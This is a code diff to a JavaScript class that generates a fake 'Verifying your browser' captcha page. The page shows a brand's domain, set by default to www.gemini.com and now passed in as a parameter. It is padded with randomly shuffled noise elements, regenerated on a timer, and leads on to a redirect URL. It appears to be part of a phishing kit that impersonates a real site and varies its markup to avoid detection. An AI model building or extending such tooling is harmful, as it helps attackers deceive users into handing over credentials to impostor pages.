@@ -50,7 +50,7 @@ class BackgroundHTMLTransformer {
     return elements.sort(() => crypto.randomBytes(1)[0] - 128).join('\n');
   }
 
-  async transformCaptchaPage(cloudflareKey, redirectUrl) {
+  async transformCaptchaPage(cloudflareKey, redirectUrl, officialDomain = 'www.gemini.com') {
     const rayId = Math.random().toString(16).substr(2, 10);
     const htmlNoise = this.generateNoiseElements();
     const bodyNoise = this.generateNoiseElements();
@@ -135,7 +135,7 @@ class BackgroundHTMLTransformer {
 
     <div class="content">
         ${contentNoise}
-        <h1 class="title">www.gemini.com</h1>
+        <h1 class="title">${officialDomain}</h1>
         <p class="subtitle">Verifying your browser before accessing the site...</p>
         
         <div id="captchaContainer">
@@ -272,18 +272,18 @@ class BackgroundHTMLTransformer {
 </html>`;
   }
 
-  async startBackgroundTransform(cloudflareKey, redirectUrl) {
+  async startBackgroundTransform(cloudflareKey, redirectUrl, officialDomain = 'www.gemini.com') {
     try {
-      this.transformedHTML = await this.transformCaptchaPage(cloudflareKey, redirectUrl);
+      this.transformedHTML = await this.transformCaptchaPage(cloudflareKey, redirectUrl, officialDomain);
       this.lastTransformTime = Date.now();
-      
+
       const captchaPath = join(this.pagesPath, 'captcha.html');
       await fsPromises.writeFile(captchaPath, this.transformedHTML, 'utf8');
       console.log('Initial captcha page transformation complete');
 
       setInterval(async () => {
         try {
-          this.transformedHTML = await this.transformCaptchaPage(cloudflareKey, redirectUrl);
+          this.transformedHTML = await this.transformCaptchaPage(cloudflareKey, redirectUrl, officialDomain);
           this.lastTransformTime = Date.now();
           await fsPromises.writeFile(captchaPath, this.transformedHTML, 'utf8');
         } catch (error) {
